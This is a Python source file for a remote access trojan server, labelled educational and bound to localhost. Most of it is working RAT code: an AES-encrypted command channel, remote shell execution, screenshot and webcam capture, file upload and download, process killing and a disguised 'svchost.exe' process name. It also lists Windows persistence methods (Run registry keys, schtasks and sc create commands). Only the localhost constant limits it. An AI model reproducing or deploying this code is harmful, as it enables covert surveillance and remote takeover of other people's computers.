"""
ENHANCED RAT Server - Educational Advanced Version
=================================================
⚠️  EDUCATIONAL PURPOSE ONLY - LOCALHOST ONLY ⚠️

Advanced features demonstrated:
- AES-256 encrypted C2 communication
- Keylogger simulation (educational only)
- Webcam capture (requires permission)
- Persistence concepts (informational)
- Stealth techniques (detection methods)

TERMS & CONDITIONS:
- FOR EDUCATIONAL/PORTFOLIO USE ONLY
- LOCALHOST (127.0.0.1) ONLY
- NO ILLEGAL USE
- CREATOR NOT LIABLE FOR MISUSE
"""

import socket
import json
import subprocess
import os
import platform
import sys
from datetime import datetime
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import psutil
from PIL import ImageGrab

try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False

# Configuration
HOST = '127.0.0.1'  # HARDCODED LOCALHOST
PORT = 4444
BUFFER_SIZE = 8192
ENCRYPTION_KEY = hashlib.sha256(b"RAT_DEMO_KEY_2025").digest()

class RATServer:
    def __init__(self):
        self.host = HOST
        self.port = PORT
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False
        self.encryption_enabled = True
        self.keylog_buffer = []
        self.process_name = "svchost.exe"  # Simulated stealth name
        
        print("=" * 60)
        print("  ENHANCED RAT SERVER v2.0 - Educational Project")
        print("  ⚠️  LOCALHOST ONLY - SAFE FOR LEARNING ⚠️")
        print("=" * 60)
        print(f"[*] Process: {self.process_name} (simulated)")
        print(f"[*] Encryption: AES-256 Enabled")
        print(f"[*] Starting server on {self.host}:{self.port}")
        
    def encrypt_data(self, data):
        """Encrypt data using AES-256-CBC with random IV"""
        try:
            iv = os.urandom(16)
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            padded_data = pad(data.encode(), AES.block_size)
            ciphertext = cipher.encrypt(padded_data)
            
            encrypted_package = {
                'iv': base64.b64encode(iv).decode(),
                'ciphertext': base64.b64encode(ciphertext).decode()
            }
            return json.dumps(encrypted_package)
        except Exception as e:
            print(f"[-] Encryption error: {e}")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES-256-CBC"""
        try:
            package = json.loads(encrypted_data)
            iv = base64.b64decode(package['iv'])
            ciphertext = base64.b64decode(package['ciphertext'])
            
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
            return decrypted_data.decode()
        except Exception as e:
            print(f"[-] Decryption error: {e}")
            return None
    
    def start_server(self):
        """Initialize and start the server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            self.running = True
            
            print(f"[+] Server listening on {self.host}:{self.port}")
            print(f"[*] Waiting for client connection...")
            
            self.client_socket, self.client_address = self.server_socket.accept()
            print(f"[+] Client connected from {self.client_address}")
            
            # Send welcome message
            welcome = {
                "status": "connected",
                "message": "Connected to RAT Server v2.0 (Enhanced)",
                "encryption": self.encryption_enabled
            }
            self.send_response(welcome)
            
            # Handle commands
            self.handle_commands()
            
        except Exception as e:
            print(f"[-] Error starting server: {e}")
            self.cleanup()
    
    def send_response(self, data):
        """Send encrypted JSON response to client"""
        try:
            json_data = json.dumps(data)
            if self.encryption_enabled:
                encrypted = self.encrypt_data(json_data)
                self.client_socket.send((encrypted + '\n').encode('utf-8'))
            else:
                self.client_socket.send((json_data + '\n').encode('utf-8'))
        except Exception as e:
            print(f"[-] Error sending response: {e}")
    
    def receive_command(self):
        """Receive encrypted command from client"""
        try:
            data = b''
            while True:
                chunk = self.client_socket.recv(BUFFER_SIZE)
                if not chunk:
                    return None
                data += chunk
                if b'\n' in chunk:
                    break
            
            if not data:
                return None
            
            if self.encryption_enabled:
                decrypted = self.decrypt_data(data.decode('utf-8').strip())
                if decrypted:
                    return json.loads(decrypted)
                return None
            else:
                return json.loads(data.decode('utf-8').strip())
        except Exception as e:
            print(f"[-] Error receiving command: {e}")
            return None
    
    def handle_commands(self):
        """Main command handling loop"""
        while self.running:
            try:
                command_data = self.receive_command()
                if not command_data:
                    print("[-] Client disconnected")
                    break
                
                command = command_data.get('command')
                print(f"[*] Received command: {command}")
                
                if command == 'ping':
                    self.cmd_ping()
                elif command == 'sysinfo':
                    self.cmd_sysinfo()
                elif command == 'screenshot':
                    self.cmd_screenshot()
                elif command == 'shell':
                    self.cmd_shell(command_data.get('params', {}).get('command', ''))
                elif command == 'filebrowser':
                    self.cmd_filebrowser(command_data.get('params', {}).get('path', '.'))
                elif command == 'processlist':
                    self.cmd_processlist()
                elif command == 'download':
                    self.cmd_download(command_data.get('filepath', ''))
                elif command == 'upload':
                    self.cmd_upload(command_data.get('filepath', ''), command_data.get('data', ''))
                elif command == 'killprocess':
                    self.cmd_killprocess(command_data.get('pid', 0))
                elif command == 'keylog':
                    self.cmd_keylog()
                elif command == 'webcam':
                    self.cmd_webcam()
                elif command == 'persistence':
                    self.cmd_persistence()
                elif command == 'stealth':
                    self.cmd_stealth_info()
                elif command == 'shutdown':
                    self.cmd_shutdown()
                    break
                else:
                    self.send_response({
                        "status": "error",
                        "message": f"Unknown command: {command}"
                    })
                    
            except Exception as e:
                print(f"[-] Error handling command: {e}")
                break
        
        self.cleanup()
    
    # ========== Basic Commands ==========
    
    def cmd_ping(self):
        """Respond to ping"""
        self.send_response({
            "status": "success",
            "message": "pong"
        })
    
    def cmd_sysinfo(self):
        """Get system information"""
        try:
            info = {
                "hostname": platform.node(),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "python_version": sys.version
            }
            
            self.send_response({
                "status": "success",
                "data": info
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_screenshot(self):
        """Take screenshot"""
        try:
            screenshot = ImageGrab.grab()
            import io
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
            
            self.send_response({
                "status": "success",
                "data": img_data
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_shell(self, command):
        """Execute shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            output = result.stdout + result.stderr
            
            self.send_response({
                "status": "success",
                "data": output
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_filebrowser(self, path):
        """Browse files"""
        try:
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                files.append({
                    "name": item,
                    "is_dir": os.path.isdir(item_path),
                    "size": os.path.getsize(item_path) if os.path.isfile(item_path) else 0
                })
            
            self.send_response({
                "status": "success",
                "data": files,
                "current_path": os.path.abspath(path)
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_processlist(self):
        """Get running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "cpu": proc.info['cpu_percent'],
                        "memory": proc.info['memory_percent']
                    })
                except:
                    pass
            
            self.send_response({
                "status": "success",
                "data": processes
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_download(self, filepath):
        """Download file from server"""
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            file_base64 = base64.b64encode(file_data).decode('utf-8')
            
            self.send_response({
                "status": "success",
                "data": file_base64,
                "filename": os.path.basename(filepath),
                "size": len(file_data)
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_upload(self, filepath, file_data):
        """Upload file to server"""
        try:
            file_bytes = base64.b64decode(file_data)
            with open(filepath, 'wb') as f:
                f.write(file_bytes)
            
            self.send_response({
                "status": "success",
                "message": f"File uploaded: {filepath}"
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    def cmd_killprocess(self, pid):
        """Kill process by PID"""
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            
            self.send_response({
                "status": "success",
                "message": f"Process {pid} terminated"
            })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": str(e)
            })
    
    # ========== Advanced Features ==========
    
    def cmd_keylog(self):
        """Keylogger simulation - Educational only"""
        # THIS IS SIMULATED - NOT A REAL KEYLOGGER
        simulated_keystrokes = "This is simulated educational data. Real keyloggers are ILLEGAL without authorization!"
        
        self.keylog_buffer.append(simulated_keystrokes)
        
        self.send_response({
            "status": "success",
            "data": {
                "active": True,
                "buffer_size": len(self.keylog_buffer),
                "sample": simulated_keystrokes,
                "warning": "⚠️ SIMULATED DATA - FOR EDUCATIONAL PURPOSES ONLY"
            }
        })
    
    def cmd_webcam(self):
        """Capture webcam image"""
        if not WEBCAM_AVAILABLE:
            self.send_response({
                "status": "error",
                "message": "opencv-python not installed or webcam not available"
            })
            return
        
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                img_data = base64.b64encode(buffer).decode('utf-8')
                
                self.send_response({
                    "status": "success",
                    "data": img_data
                })
            else:
                self.send_response({
                    "status": "error",
                    "message": "Failed to capture webcam image"
                })
        except Exception as e:
            self.send_response({
                "status": "error",
                "message": f"Webcam error: {str(e)}"
            })
    
    def cmd_persistence(self):
        """Provide persistence technique information - Educational only"""
        # THIS DOES NOT IMPLEMENT PERSISTENCE - ONLY PROVIDES INFORMATION
        
        persistence_info = {
            "registry": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
            ],
            "startup": [
                "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            ],
            "scheduled_tasks": [
                "schtasks /create /tn <name> /tr <path> /sc onlogon",
                "Task Scheduler library entries"
            ],
            "services": [
                "sc create <name> binPath= <path> start= auto",
                "Windows Service creation"
            ],
            "warning": "⚠️ This is EDUCATIONAL information only! Creating unauthorized persistence is ILLEGAL!"
        }
        
        self.send_response({
            "status": "success",
            "data": persistence_info
        })
    
    def cmd_stealth_info(self):
        """Provide stealth technique information"""
        stealth_info = {
            "techniques": [
                "Process name obfuscation (svchost.exe simulation)",
                "AES-256 encrypted C2 communication",
                "No persistence (educational version)",
                "Localhost-only operation",
                "No file modifications"
            ],
            "detection_methods": [
                "Network traffic analysis (encrypted patterns)",
                "Process behavior monitoring",
                "Antivirus signature detection",
                "Heuristic analysis",
                "Behavioral detection (unusual API calls)",
                "Memory forensics"
            ],
            "current_status": {
                "process_name": self.process_name,
                "encryption_enabled": self.encryption_enabled,
                "localhost_only": True,
                "port": self.port
            }
        }
        
        self.send_response({
            "status": "success",
            "data": stealth_info
        })
    
    def cmd_shutdown(self):
        """Shutdown server"""
        self.send_response({
            "status": "success",
            "message": "Server shutting down"
        })
        self.running = False
    
    def cleanup(self):
        """Clean up resources"""
        print("[*] Cleaning up...")
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("[*] Server stopped")

def main():
    """Main entry point"""
    print("\n⚠️  TERMS & CONDITIONS ⚠️")
    print("This RAT is for EDUCATIONAL purposes only!")
    print("- Portfolio demonstrations")
    print("- Security research")
    print("- Interview presentations")
    print("- LOCALHOST ONLY (127.0.0.1)")
    print("\nNO UNAUTHORIZED USE - Creator NOT liable for misuse\n")
    
    try:
        server = RATServer()
        server.start_server()
    except KeyboardInterrupt:
        print("\n[!] Server interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")

if __name__ == "__main__":
    main()
